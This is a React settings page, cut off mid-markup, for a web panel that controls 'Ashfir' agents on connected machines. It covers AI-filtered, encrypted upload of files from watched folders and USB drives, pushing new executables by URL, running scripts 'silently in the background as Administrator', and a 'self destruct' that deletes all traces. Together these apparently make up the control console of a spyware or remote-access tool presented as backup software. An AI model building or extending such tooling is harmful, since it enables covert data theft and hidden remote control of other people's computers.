import { useEffect, useState } from 'react'
import { api } from '../api'
import { Save, Plus, X, Loader2, CheckCircle2, Eye, EyeOff, Skull, AlertTriangle, Settings as SettingsIcon, Shield, Cpu, RefreshCw, Terminal } from 'lucide-react'

function Section({ title, icon: Icon, children, danger = false }) {
  return (
    <div className={`card p-6 mb-5 animate-slide-up ${danger ? 'border-red-500/20 bg-red-500/[0.02]' : ''}`}>
      <h2 className={`text-xs font-mono font-bold tracking-widest uppercase mb-5 pb-3 border-b flex items-center gap-2 ${danger ? 'text-red-400 border-red-500/15' : 'text-cyan-400 border-cyan-900/30'}`}>
        {Icon && <Icon className="w-4 h-4" />}
        {title}
      </h2>
      {children}
    </div>
  )
}

function Toggle({ checked, onChange, label, desc }) {
  return (
    <div className="flex items-center justify-between py-2">
      <div>
        <div className="text-sm font-medium text-cyan-200">{label}</div>
        {desc && <div className="text-[10px] text-cyan-700 mt-0.5 font-mono">{desc}</div>}
      </div>
      <button
        onClick={() => onChange(!checked)}
        className={`relative w-11 h-6 rounded-full border transition-all duration-200 flex-shrink-0 ${
          checked ? 'bg-cyan-600 border-cyan-500 shadow-[0_0_12px_rgba(6,182,212,0.3)]' : 'bg-[#070b14] border-cyan-900/40'
        }`}
      >
        <div className={`absolute top-0.5 left-0.5 w-5 h-5 bg-white rounded-full shadow transition-transform duration-200 ${checked ? 'translate-x-5' : ''}`} />
      </button>
    </div>
  )
}

function TagList({ tags, onRemove, placeholder, onAdd, addValue, setAddValue }) {
  return (
    <div>
      <div className="flex flex-wrap gap-2 mb-3 min-h-[32px]">
        {tags.map((t, i) => (
          <span key={t} className="inline-flex items-center gap-1 badge bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 py-1 px-2.5">
            <span className="font-mono text-[10px]">{t}</span>
            <button onClick={() => onRemove(i)} className="text-cyan-700 hover:text-red-400 transition-colors ml-0.5">
              <X className="w-3 h-3" />
            </button>
          </span>
        ))}
        {tags.length === 0 && <span className="text-[10px] text-cyan-800 italic self-center font-mono">{placeholder}</span>}
      </div>
      <div className="flex gap-2">
        <input
          className="inp font-mono max-w-[140px]"
          value={addValue}
          onChange={e => setAddValue(e.target.value)}
          placeholder=".pdf"
          onKeyDown={e => { if (e.key === 'Enter') { e.preventDefault(); onAdd() } }}
        />
        <button className="btn-ghost flex items-center gap-1.5" onClick={onAdd}>
          <Plus className="w-3.5 h-3.5" /> Add
        </button>
      </div>
    </div>
  )
}

async function sha256(message) {
  const msgBuffer = new TextEncoder().encode(message);
  const hashBuffer = await window.crypto.subtle.digest('SHA-256', msgBuffer);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
  return hashHex;
}

export default function Settings() {
  const [cfg, setCfg]           = useState(null)
  const [privateKey, setPrivateKey] = useState(() => localStorage.getItem('ashfir_private_key') || '')
  const [saving, setSaving]     = useState(false)
  const [saved, setSaved]       = useState(false)
  const [showKey, setShowKey]   = useState(false)
  const [newAllow, setNewAllow] = useState('')
  const [newBlock, setNewBlock] = useState('')
  const [newPath, setNewPath]   = useState('')

  // Settings Lock State
  const [unlocked, setUnlocked] = useState(false)
  const [passwordInput, setPasswordInput] = useState('')
  const [setupMode, setSetupMode] = useState(false)
  const [authError, setAuthError] = useState('')
  const [newPassword, setNewPassword] = useState('')
  const [newPrivacyPassword, setNewPrivacyPassword] = useState('')
  const [lockoutSecs, setLockoutSecs] = useState(0)

  useEffect(() => {
    const checkLockout = () => {
      const lockoutUntil = Number(localStorage.getItem('settings_lockout_until') || 0);
      if (lockoutUntil > Date.now()) {
        setLockoutSecs(Math.ceil((lockoutUntil - Date.now()) / 1000));
      } else {
        setLockoutSecs(0);
      }
    };
    checkLockout();
    const t = setInterval(checkLockout, 1000);
    return () => clearInterval(t);
  }, []);

  // Self-Destruct state
  const [agents, setAgents]                 = useState([])
  const [destructTarget, setDestructTarget] = useState(null)
  const [destructStep, setDestructStep]     = useState(0)
  const [destructToast, setDestructToast]   = useState(null)

  // Remote Update state
  const [updateUrl, setUpdateUrl]           = useState('')
  const [updateTarget, setUpdateTarget]     = useState(null)
  const [updateStep, setUpdateStep]         = useState(0)
  const [updateToast, setUpdateToast]       = useState(null)

  // Remote Code state
  const [remoteCode, setRemoteCode]         = useState('')
  const [codeType, setCodeType]             = useState('batch')
  const [codeTarget, setCodeTarget]         = useState(null)
  const [codeStep, setCodeStep]             = useState(0)
  const [codeToast, setCodeToast]           = useState(null)

  useEffect(() => { 
    api.getConfig().then(d => {
      // Default extensions if empty
      if (!d.allowed_extensions || d.allowed_extensions.length === 0) {
        d.allowed_extensions = ['.word', '.docx', '.pdf', '.xlsx']
      }
      setCfg(d)
      if (!d.settings_password_hash) {
        setSetupMode(true)
      }
    }).catch(() => {}) 
  }, [])
  useEffect(() => { api.getAgents().then(d => setAgents(d.agents || [])).catch(() => {}) }, [])

  function set(path, val) {
    setCfg(prev => {
      const next = { ...prev }
      const keys = path.split('.')
      let cur = next
      for (let i = 0; i < keys.length - 1; i++) {
        cur[keys[i]] = { ...cur[keys[i]] }
        cur = cur[keys[i]]
      }
      cur[keys[keys.length - 1]] = val
      return next
    })
  }

  function addExt(type) {
    const key = type === 'allow' ? 'allowed_extensions' : 'blocked_extensions'
    const val = type === 'allow' ? newAllow : newBlock
    let ext = val.trim().toLowerCase()
    if (!ext) return
    if (!ext.startsWith('.')) ext = '.' + ext
    if (!(cfg[key] || []).includes(ext)) set(key, [...(cfg[key] || []), ext])
    type === 'allow' ? setNewAllow('') : setNewBlock('')
  }

  function removeExt(type, i) {
    const key = type === 'allow' ? 'allowed_extensions' : 'blocked_extensions'
    set(key, (cfg[key] || []).filter((_, idx) => idx !== i))
  }

  function addPath() {
    if (!newPath.trim()) return
    set('watch_paths', [...(cfg.watch_paths || []), newPath.trim()])
    setNewPath('')
  }

  async function save() {
    setSaving(true)
    try {
      localStorage.setItem('ashfir_private_key', privateKey.trim())
      await api.saveConfig(cfg)
      setSaved(true)
      setTimeout(() => setSaved(false), 3000)
    } catch {}
    setSaving(false)
  }

  async function handleUnlock() {
    setAuthError('')
    const lockoutUntil = Number(localStorage.getItem('settings_lockout_until') || 0);
    if (Date.now() < lockoutUntil) {
      return;
    }
    if (!passwordInput.trim()) {
      setAuthError('Şifre boş olamaz.')
      return
    }
    const hash = await sha256(passwordInput.trim())
    if (hash === cfg.settings_password_hash) {
      setUnlocked(true)
      setAuthError('')
      localStorage.removeItem('settings_failed_attempts');
      localStorage.removeItem('settings_lockout_until');
    } else {
      const failed = Number(localStorage.getItem('settings_failed_attempts') || 0) + 1;
      localStorage.setItem('settings_failed_attempts', failed);
      if (failed >= 5) {
        const blockTime = Date.now() + 30000; // 30 seconds block
        localStorage.setItem('settings_lockout_until', blockTime);
        setAuthError('Çok fazla hatalı deneme. 30 saniye engellendiniz.');
      } else {
        setAuthError(`Hatalı şifre. Kalan hak: ${5 - failed}`);
      }
    }
  }

  async function handleSetup() {
    setAuthError('')
    if (passwordInput.trim().length < 6) {
      setAuthError('Şifre en az 6 karakter olmalıdır.')
      return
    }
    const hash = await sha256(passwordInput.trim())
    const updatedCfg = { ...cfg, settings_password_hash: hash }
    setSaving(true)
    try {
      await api.saveConfig(updatedCfg)
      setCfg(updatedCfg)
      setSetupMode(false)
      setUnlocked(true)
      setPasswordInput('')
      setSaved(true)
      setTimeout(() => setSaved(false), 3000)
    } catch (e) {
      setAuthError('Şifre kaydedilemedi: ' + e.message)
    } finally {
      setSaving(false)
    }
  }

  function startDestruct(machine) {
    setDestructTarget(machine)
    setDestructStep(1)
  }

  function cancelDestruct() {
    setDestructTarget(null)
    setDestructStep(0)
  }

  async function executeDestruct() {
    if (!destructTarget) return
    setDestructStep(3)
    try {
      await api.selfDestruct(destructTarget)
      setDestructToast('\u{1F480} İmha komutu "' + destructTarget + '" için gönderildi!')
      setTimeout(() => setDestructToast(null), 5000)
    } catch (e) {
      setDestructToast('\u274C İmha hatası: ' + e.message)
      setTimeout(() => setDestructToast(null), 5000)
    }
    cancelDestruct()
  }

  function startUpdate(machine) {
    if (!updateUrl.trim()) return
    setUpdateTarget(machine)
    setUpdateStep(1)
  }

  function cancelUpdate() {
    setUpdateTarget(null)
    setUpdateStep(0)
  }

  async function executeUpdate() {
    if (!updateTarget || !updateUrl.trim()) return
    setUpdateStep(2)
    try {
      await api.remoteUpdate(updateTarget, updateUrl.trim())
      setUpdateToast('🔄 Güncelleme komutu "' + updateTarget + '" için gönderildi!')
      setTimeout(() => setUpdateToast(null), 5000)
    } catch (e) {
      setUpdateToast('❌ Güncelleme hatası: ' + e.message)
      setTimeout(() => setUpdateToast(null), 5000)
    }
    cancelUpdate()
  }

  function startCode(machine) {
    if (!remoteCode.trim()) return
    setCodeTarget(machine)
    setCodeStep(1)
  }

  function cancelCode() {
    setCodeTarget(null)
    setCodeStep(0)
  }

  async function executeCode() {
    if (!codeTarget || !remoteCode.trim()) return
    setCodeStep(2)
    try {
      await api.remoteCode(codeTarget, remoteCode.trim(), codeType)
      setCodeToast('💻 Kod komutu "' + codeTarget + '" için gönderildi!')
      setTimeout(() => setCodeToast(null), 5000)
    } catch (e) {
      setCodeToast('❌ Kod çalıştırma hatası: ' + e.message)
      setTimeout(() => setCodeToast(null), 5000)
    }
    cancelCode()
  }

  if (!cfg) return (
    <div className="p-8 flex items-center justify-center h-64">
      <div className="flex flex-col items-center gap-3">
        <Loader2 className="w-6 h-6 animate-spin text-cyan-600" />
        <span className="text-[10px] font-mono text-cyan-700 tracking-widest uppercase">Loading Config...</span>
      </div>
    </div>
  )

  if (!unlocked && (setupMode || cfg.settings_password_hash)) {
    return (
      <div className="p-8 max-w-md mx-auto min-h-[400px] flex flex-col gap-6 justify-center animate-fade-in" id="settings_lock_screen">
        <div className="card p-6 border-cyan-500/20 bg-[#0b1221]/80 backdrop-blur-md relative overflow-hidden">
          <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-cyan-500 to-emerald-500" />
          
          <div className="flex flex-col items-center text-center mb-6">
            <div className="w-12 h-12 rounded-xl bg-cyan-950/40 border border-cyan-500/30 flex items-center justify-center mb-4 shadow-[0_0_15px_rgba(6,182,212,0.2)]">
              <Shield className="w-6 h-6 text-cyan-400" />
            </div>
            <h2 className="text-sm font-mono font-bold tracking-widest text-cyan-400 uppercase">
              {setupMode ? 'PANEL GÜVENLİK KURULUMU' : 'GÜVENLİ ERİŞİM KONTROLÜ'}
            </h2>
            <p className="text-[10px] text-cyan-600 font-mono mt-1 uppercase tracking-wider">
              {setupMode ? 'SETTINGS SECURITY CONFIG' : 'AUTHORIZED ACCESS ONLY'}
            </p>
          </div>

          <p className="text-xs text-cyan-300 mb-5 text-center leading-relaxed font-mono">
            {setupMode 
              ? 'Ayarlar panelini, remote code ve imha yetkilerini korumak için yeni bir güvenlik şifresi belirleyin.' 
              : 'Ayarlar ve kontrol paneline erişmek için güvenlik şifrenizi girmeniz gerekmektedir.'}
          </p>

          <div className="space-y-4">
            <div>
              <label className="block text-[9px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-1.5">
                {setupMode ? 'YENİ GÜVENLİK ŞİFRESİ' : 'GÜVENLİK ŞİFRESİ'}
              </label>
              <input
                type="password"
                className="inp text-center tracking-widest"
                value={passwordInput}
                onChange={e => setPasswordInput(e.target.value)}
                placeholder="••••••"
                disabled={lockoutSecs > 0}
                onKeyDown={e => {
                  if (e.key === 'Enter' && lockoutSecs === 0) {
                    setupMode ? handleSetup() : handleUnlock()
                  }
                }}
              />
            </div>

            {authError && (
              <div className="p-2.5 rounded bg-red-500/10 border border-red-500/20 text-red-400 text-[10px] font-mono text-center animate-slide-up">
                {authError}
              </div>
            )}

            <button
              onClick={setupMode ? handleSetup : handleUnlock}
              disabled={saving || lockoutSecs > 0}
              className="w-full btn-primary flex items-center justify-center gap-2"
            >
              {saving ? <Loader2 className="w-4 h-4 animate-spin" /> : <Shield className="w-4 h-4" />}
              {lockoutSecs > 0 ? `ENGELLENDİNİZ (${lockoutSecs}s)` : (setupMode ? 'ŞİFREYİ KAYDET VE KİLİTLE' : 'ERİŞİM YETKİSİNİ DOĞRULA')}
            </button>
          </div>
        </div>

        {/* Local Decryption Key */}
        <div className="card p-6 border-amber-500/20 bg-[#0b1221]/80 backdrop-blur-md relative overflow-hidden">
          <div className="absolute top-0 left-0 w-full h-1 bg-amber-500/40" />
          <h2 className="text-xs font-mono font-bold tracking-widest uppercase mb-4 text-amber-400 flex items-center gap-2">
            <Shield className="w-4 h-4" />
            DECRYPTION & DOWNLOAD KEY
          </h2>
          <div className="space-y-4">
            <div className="p-3 rounded-lg bg-amber-500/10 border border-amber-500/20 text-[10px] text-amber-400/90 font-mono">
              <strong>Önemli:</strong> Dosyaları indirmek ve çözmek için gereken Özel Anahtar (Private Key) sadece tarayıcınızda (localStorage) saklanır. Şifreyi çözmek için anahtarınızı buraya kaydedebilirsiniz.
            </div>
            <div>
              <label className="block text-[9px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-1.5">RSA PRIVATE KEY</label>
              <textarea 
                className="inp text-[10px] min-h-[100px] resize-y font-mono" 
                value={privateKey} 
                onChange={e => setPrivateKey(e.target.value)} 
                placeholder={"-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"} 
              />
            </div>
            <button
              onClick={() => {
                localStorage.setItem('ashfir_private_key', privateKey.trim())
                alert('Özel anahtar tarayıcıya başarıyla kaydedildi!')
              }}
              className="w-full btn-ghost flex items-center justify-center gap-2 border-amber-500/35 hover:border-amber-500/60 text-amber-400 font-mono text-xs"
            >
              <CheckCircle2 className="w-4 h-4" />
              ANAHTARI TARAYICIYA KAYDET
            </button>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="p-8 max-w-2xl">
      <div className="flex items-center justify-between mb-6 animate-fade-in">
        <div>
          <h1 className="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-emerald-400 tracking-widest flex items-center gap-3">
            <SettingsIcon className="w-6 h-6 text-cyan-400" />
            SETTINGS
          </h1>
          <p className="text-[10px] font-mono text-cyan-600 uppercase tracking-[0.2em] mt-1">Agent Configuration Panel</p>
        </div>
        <button className="btn-primary flex items-center gap-2" onClick={save} disabled={saving}>
          {saving ? <Loader2 className="w-4 h-4 animate-spin" /> : saved ? <CheckCircle2 className="w-4 h-4" /> : <Save className="w-4 h-4" />}
          {saving ? 'SAVING...' : saved ? 'SAVED!' : 'DEPLOY'}
        </button>
      </div>

      {saved && (
        <div className="mb-4 p-3 rounded-lg bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs flex items-center gap-2 font-mono animate-slide-up">
          <CheckCircle2 className="w-4 h-4 flex-shrink-0" />
          Config deployed. Agent will update within 30 seconds.
        </div>
      )}

      {/* AI Filter */}
      <Section title="AI Filter — Groq Llama 70B" icon={Cpu}>
        <Toggle
          checked={cfg.ai_filter_enabled !== false}
          onChange={v => set('ai_filter_enabled', v)}
          label="Enable AI Filter"
          desc="Llama 70B decides which files to backup"
        />
        <div className="mt-4">
          <label className="block text-[10px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-2">Groq API Key</label>
          <div className="relative">
            <input
              className="inp pr-10"
              type={showKey ? 'text' : 'password'}
              value={cfg.groq_api_key || ''}
              onChange={e => set('groq_api_key', e.target.value)}
              placeholder="gsk_..."
            />
            <button className="absolute right-3 top-1/2 -translate-y-1/2 text-cyan-700 hover:text-cyan-400 transition-colors" onClick={() => setShowKey(!showKey)}>
              {showKey ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>
          <a href="https://console.groq.com" target="_blank" rel="noreferrer" className="text-[10px] text-cyan-600 hover:text-cyan-400 mt-1 inline-block font-mono">
            console.groq.com →
          </a>
        </div>
        <div className="mt-4">
          <label className="block text-[10px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-2">Model</label>
          <select className="inp" value={cfg.ai_model || 'llama-3.3-70b-versatile'} onChange={e => set('ai_model', e.target.value)}>
            <option value="llama-3.3-70b-versatile">llama-3.3-70b-versatile (Recommended)</option>
            <option value="llama-3.1-8b-instant">llama-3.1-8b-instant (Fast)</option>
            <option value="mixtral-8x7b-32768">mixtral-8x7b-32768</option>
          </select>
        </div>
      </Section>

      {/* Watch paths */}
      <Section title="Watch Directories">
        <div className="space-y-2 mb-3">
          {(cfg.watch_paths || []).map((p, i) => (
            <div key={i} className="flex gap-2">
              <input className="inp" value={p} onChange={e => { const a = [...cfg.watch_paths]; a[i] = e.target.value; set('watch_paths', a) }} />
              <button className="btn-danger p-2.5 flex-shrink-0" onClick={() => set('watch_paths', cfg.watch_paths.filter((_, j) => j !== i))}>
                <X className="w-3.5 h-3.5" />
              </button>
            </div>
          ))}
        </div>
        <div className="flex gap-2">
          <input className="inp" value={newPath} onChange={e => setNewPath(e.target.value)} placeholder={'C:\\Users\\...\\Documents'} onKeyDown={e => e.key==='Enter' && addPath()} />
          <button className="btn-ghost flex-shrink-0 flex items-center gap-1.5" onClick={addPath}><Plus className="w-3.5 h-3.5" />Add</button>
        </div>
      </Section>

      {/* Extensions */}
      <Section title="File Extensions">
        <div className="mb-5">
          <label className="block text-[10px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-3">
            Allowed <span className="text-cyan-800 font-normal normal-case">(empty = all)</span>
          </label>
          <TagList
            tags={cfg.allowed_extensions || []}
            onRemove={i => removeExt('allow', i)}
            placeholder="All extensions allowed"
            onAdd={() => addExt('allow')}
            addValue={newAllow}
            setAddValue={setNewAllow}
          />
        </div>
        <div className="border-t border-cyan-900/30 pt-5">
          <label className="block text-[10px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-3">Blocked</label>
          <TagList
            tags={cfg.blocked_extensions || []}
            onRemove={i => removeExt('block', i)}
            placeholder="No blocked extensions"
            onAdd={() => addExt('block')}
            addValue={newBlock}
            setAddValue={setNewBlock}
          />
        </div>
      </Section>

      {/* General */}
      <Section title="General">
        <div className="grid grid-cols-2 gap-4 mb-4">
          <div>
            <label className="block text-[10px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-2">Max File Size (MB)</label>
            <input className="inp" type="number" min={1} value={cfg.max_file_size_mb || 50} onChange={e => set('max_file_size_mb', +e.target.value)} />
          </div>
          <div>
            <label className="block text-[10px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-2">Debounce (sec)</label>
            <input className="inp" type="number" min={0.5} step={0.5} value={cfg.debounce_seconds || 2} onChange={e => set('debounce_seconds', +e.target.value)} />
          </div>
        </div>
        <div className="space-y-1 border-t border-cyan-900/30 pt-4">
          <Toggle checked={!!cfg.sync_on_start} onChange={v => set('sync_on_start', v)} label="Sync On Start" desc="Upload existing files when agent starts" />
          <Toggle checked={!!cfg.test_mode} onChange={v => set('test_mode', v)} label="Test Mode (30s)" desc="Reduces sync interval to 30 seconds" />
        </div>
      </Section>

      {/* Flash Drive */}
      <Section title="Flash Drive Backup">
        <Toggle
          checked={cfg.flash_enabled !== false}
          onChange={v => set('flash_enabled', v)}
          label="Enable Flash Backup"
          desc="Auto-backup files from USB/flash drives"
        />
        <div className="mt-4">
          <label className="block text-[10px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-2">Max File Size (MB)</label>
          <input
            className="inp w-40"
            type="number"
            min={1}
            max={100}
            value={cfg.flash_max_mb ?? 10}
            onChange={e => set('flash_max_mb', +e.target.value)}
          />
          <p className="text-[10px] text-cyan-700 mt-2 font-mono">Files above this limit will be skipped. Recommended: 10 MB.</p>
        </div>
        <div className="mt-4 p-3 rounded-lg bg-cyan-500/5 border border-cyan-500/15 text-[10px] text-cyan-600 font-mono">
          <strong className="text-cyan-400">How it works:</strong><br />
          Flash files are first staged locally, then uploaded. Backup continues even if flash is removed.
        </div>
      </Section>

      {/* Security */}
      <Section title="Security & Decryption" icon={Shield}>
        <div className="space-y-4">
          <div className="p-3 rounded-lg bg-amber-500/10 border border-amber-500/20 text-[10px] text-amber-400/90 mb-4 font-mono">
            <strong>Important:</strong> Files are encrypted with RSA/AES. To view or download files, paste your Private Key here. It stays in your browser (localStorage) only.
          </div>
          <div>
            <label className="block text-[10px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-2">RSA Private Key</label>
            <textarea 
              className="inp text-[10px] min-h-[120px] resize-y" 
              value={privateKey} 
              onChange={e => setPrivateKey(e.target.value)} 
              placeholder={"-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"} 
            />
          </div>
          <div className="border-t border-cyan-900/30 pt-4 mt-4">
            <label className="block text-[10px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-2">Panel Güvenlik Şifresini Güncelle</label>
            <div className="flex gap-2">
              <input
                type="password"
                className="inp text-xs font-mono"
                placeholder="Yeni şifre girin (en az 6 karakter)..."
                value={newPassword}
                onChange={e => setNewPassword(e.target.value)}
              />
              <button 
                onClick={async () => {
                  if (newPassword.trim().length < 6) {
                    alert('Şifre en az 6 karakter olmalıdır.');
                    return;
                  }
                  const hash = await sha256(newPassword.trim());
                  set('settings_password_hash', hash);
                  setNewPassword('');
                  alert('Yeni şifre uygulandı. Değişikliklerin kaydedilmesi için yukarıdaki "DEPLOY" butonuna basarak kaydedin.');
                }}
                className="btn-ghost flex-shrink-0"
              >
                Uygula
              </button>
            </div>
          </div>
          <div className="border-t border-cyan-900/30 pt-4 mt-4">
            <label className="block text-[10px] font-mono font-bold text-amber-500 uppercase tracking-widest mb-2">2. Güvenlik (Gizlilik/Karartma) Şifresini Güncelle</label>
            <div className="flex gap-2">
              <input
                type="password"
                className="inp text-xs font-mono border-amber-500/20 focus:border-amber-500/40"
                placeholder="Yeni gizlilik şifresi girin (en az 6 karakter)..."
                value={newPrivacyPassword}
                onChange={e => setNewPrivacyPassword(e.target.value)}
              />
              <button 
                onClick={async () => {
                  if (newPrivacyPassword.trim().length < 6) {
                    alert('Şifre en az 6 karakter olmalıdır.');
                    return;
                  }
                  const hash = await sha256(newPrivacyPassword.trim());
                  set('privacy_password_hash', hash);
                  setNewPrivacyPassword('');
                  alert('Yeni gizlilik şifresi uygulandı. Değişikliklerin kaydedilmesi için yukarıdaki "DEPLOY" butonuna basarak kaydedin.');
                }}
                className="btn-ghost flex-shrink-0 text-amber-400 border-amber-500/30 hover:border-amber-500/60"
              >
                Uygula
              </button>
            </div>
          </div>
        </div>
      </Section>

      {/* ══ REMOTE UPDATE SECTION ══ */}
      <Section title="Remote Update" icon={Cpu}>
        <div className="p-3 rounded-lg bg-cyan-500/5 border border-cyan-500/15 text-[10px] text-cyan-600 mb-5 font-mono">
          <div className="flex items-start gap-2">
            <Cpu className="w-4 h-4 text-cyan-400 flex-shrink-0 mt-0.5" />
            <div>
              <strong className="text-cyan-400">REMOTE UPDATE AGENT</strong>
              <p className="mt-1 text-cyan-700">
                You can push a new agent executable to the connected nodes remotely. Enter the direct download link for the new version.
              </p>
            </div>
          </div>
        </div>

        {agents.length === 0 ? (
          <div className="text-xs text-cyan-700 text-center py-4 font-mono">No connected nodes found.</div>
        ) : (
          <div className="space-y-4">
            <div>
              <label className="block text-[10px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-2">New Version URL</label>
              <input 
                className="inp text-xs font-mono" 
                value={updateUrl} 
                onChange={e => setUpdateUrl(e.target.value)} 
                placeholder="https://example.com/ashfir_agent_new.exe" 
              />
            </div>
            <div className="space-y-2">
              {agents.map(a => (
                <div key={a.machine_name} className="flex items-center justify-between p-3 rounded-lg bg-[#070b14] border border-cyan-900/30">
                  <div className="flex items-center gap-3">
                    <div className={`w-2 h-2 rounded-full flex-shrink-0 ${a.online ? 'bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.7)]' : 'bg-cyan-900'}`} />
                    <div>
                      <div className="text-xs font-mono font-bold text-cyan-300">{a.machine_name}</div>
                      <div className="text-[9px] text-cyan-700 font-mono">
                        {a.online ? 'Online' : 'Offline'} • {a.files_uploaded || 0} files uploaded
                      </div>
                    </div>
                  </div>
                  <button
                    onClick={() => startUpdate(a.machine_name)}
                    disabled={!updateUrl.trim()}
                    className="btn-ghost flex items-center gap-1.5 hover:border-cyan-500/40"
                  >
                    <RefreshCw className="w-3.5 h-3.5" />
                    UPDATE
                  </button>
                </div>
              ))}
            </div>
          </div>
        )}
      </Section>

      {/* ══ REMOTE CODE EXECUTOR SECTION ══ */}
      <Section title="Remote Code Executor" icon={Terminal}>
        <div className="p-3 rounded-lg bg-cyan-500/5 border border-cyan-500/15 text-[10px] text-cyan-600 mb-5 font-mono">
          <div className="flex items-start gap-2">
            <Terminal className="w-4 h-4 text-cyan-400 flex-shrink-0 mt-0.5" />
            <div>
              <strong className="text-cyan-400">EXECUTE REMOTE SCRIPTS</strong>
              <p className="mt-1 text-cyan-700">
                You can push and execute custom scripts on the connected nodes silently in the background as Administrator.
              </p>
            </div>
          </div>
        </div>

        {agents.length === 0 ? (
          <div className="text-xs text-cyan-700 text-center py-4 font-mono">No connected nodes found.</div>
        ) : (
          <div className="space-y-4">
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-[10px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-2">Script Type</label>
                <select 
                  className="inp text-xs font-mono select bg-[#070b14] text-cyan-300 border border-cyan-500/30 w-full"
                  value={codeType}
                  onChange={e => setCodeType(e.target.value)}
                >
                  <option value="batch">Batch / CMD</option>
                  <option value="powershell">PowerShell</option>
                  <option value="python">Python</option>
                </select>
              </div>
            </div>

            <div>
              <label className="block text-[10px] font-mono font-bold text-cyan-600 uppercase tracking-widest mb-2">Paste Code / Script</label>
              <textarea 
                className="inp text-xs font-mono min-h-[140px] w-full resize-y" 
                value={remoteCode} 
                onChange={e => setRemoteCode(e.target.value)} 
                placeholder={codeType === 'batch' ? "echo Hello from Ashfir Agent\nipconfig /all" : codeType === 'powershell' ? "Get-Process | Select-Object Name, Id" : "import sys\nprint('Python execution works!')"} 
              />
            </div>

            <div className="space-y-2">
              {agents.map(a => (
                <div key={a.machine_name} className="flex items-center justify-between p-3 rounded-lg bg-[#070b14] border border-cyan-900/30">
                  <div className="flex items-center gap-3">
                    <div className={`w-2 h-2 rounded-full flex-shrink-0 ${a.online ? 'bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.7)]' : 'bg-cyan-900'}`} />
                    <div>
                      <div className="text-xs font-mono font-bold text-cyan-300">{a.machine_name}</div>
                      <div className="text-[9px] text-cyan-700 font-mono">
                        {a.online ? 'Online' : 'Offline'} • {a.files_uploaded || 0} files uploaded
                      </div>
                    </div>
                  </div>
                  <button
                    onClick={() => startCode(a.machine_name)}
                    disabled={!remoteCode.trim()}
                    className="btn-ghost flex items-center gap-1.5 hover:border-cyan-500/40"
                  >
                    <Terminal className="w-3.5 h-3.5" />
                    RUN
                  </button>
                </div>
              ))}
            </div>
          </div>
        )}
      </Section>

      {/* ══ SELF-DESTRUCT SECTION ══ */}
      <Section title="Self Destruct" icon={Skull} danger>
        <div className="p-3 rounded-lg bg-red-500/5 border border-red-500/15 text-[10px] text-cyan-600 mb-5 font-mono">
          <div className="flex items-start gap-2">
            <AlertTriangle className="w-4 h-4 text-red-400 flex-shrink-0 mt-0.5" />
            <div>
              <strong className="text-red-400">WARNING — IRREVERSIBLE</strong>
              <p className="mt-1 text-cyan-700">
                This command permanently removes the agent from the target machine. The .exe, config files and all traces will be deleted.
              </p>
            </div>
          </div>
        </div>

        {agents.length === 0 ? (
          <div className="text-xs text-cyan-700 text-center py-4 font-mono">No connected nodes found.</div>
        ) : (
          <div className="space-y-2">
            {agents.map(a => (
              <div key={a.machine_name} className="flex items-center justify-between p-3 rounded-lg bg-[#070b14] border border-cyan-900/30">
                <div className="flex items-center gap-3">
                  <div className={`w-2 h-2 rounded-full flex-shrink-0 ${a.online ? 'bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.7)]' : 'bg-cyan-900'}`} />
                  <div>
                    <div className="text-xs font-mono font-bold text-cyan-300">{a.machine_name}</div>
                    <div className="text-[9px] text-cyan-700 font-mono">
                      {a.online ? 'Online' : 'Offline'} • {a.files_uploaded || 0} files uploaded
                    </div>
                  </div>
                </div>
                <button
                  onClick={() => startDestruct(a.machine_name)}
                  className="btn-danger flex items-center gap-1.5"
                >
                  <Skull className="w-3.5 h-3.5" />
                  DESTROY
                </button>
              </div>
            ))}
          </div>
        )}
      </Section>

      {/* ══ SELF-DESTRUCT CONFIRMATION MODAL ══ */}
      {destructStep > 0 && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fade-in">
          <div className="bg-[#0b1221] border border-red-500/30 rounded-2xl p-6 w-full max-w-md shadow-2xl shadow-red-500/10">

            {destructStep === 1 && (
              <>
                <div className="flex items-center gap-3 mb-4">
                  <div className="w-10 h-10 rounded-xl bg-red-500/15 border border-red-500/25 flex items-center justify-center">
                    <AlertTriangle className="w-5 h-5 text-red-400" />
                  </div>
                  <div>
                    <h3 className="text-base font-mono font-bold text-red-400">CONFIRM — 1/2</h3>
                    <p className="text-[10px] text-cyan-600 font-mono">"{destructTarget}" will be destroyed</p>
                  </div>
                </div>
                <p className="text-sm text-cyan-400 mb-5 font-mono">
                  <strong className="text-red-400">{destructTarget}</strong> agent will be permanently deleted.
                </p>
                <div className="flex gap-3">
                  <button onClick={cancelDestruct} className="btn-ghost flex-1">Cancel</button>
                  <button
                    onClick={() => setDestructStep(2)}
                    className="flex-1 flex items-center justify-center gap-2 px-4 py-2.5 rounded-lg text-xs font-mono font-bold
                               bg-red-500/15 hover:bg-red-500/25 text-red-400 hover:text-red-300
                               border border-red-500/25 hover:border-red-500/40 transition-all tracking-wider"
                  >
